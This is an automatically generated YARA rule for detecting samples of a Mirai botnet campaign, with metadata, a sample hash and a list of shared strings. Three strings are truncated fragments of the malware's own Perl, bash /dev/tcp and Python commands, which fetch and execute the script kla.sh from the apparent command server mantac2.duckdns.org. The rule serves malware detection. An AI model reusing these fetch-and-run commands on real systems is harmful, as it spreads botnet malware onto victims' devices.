rule Sightlines_tlsh_97e852b8_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-97e852b8"
        date = "2026-10-29"
        campaign = "tlsh-97e852b8"
        family = "mirai"
        hash = "226bd33caa93d3ed07e70f229d58188caa10caa369cf9d1fbcc3af2842b3c5b5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-97e852b8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2110816 and 12 of them
}
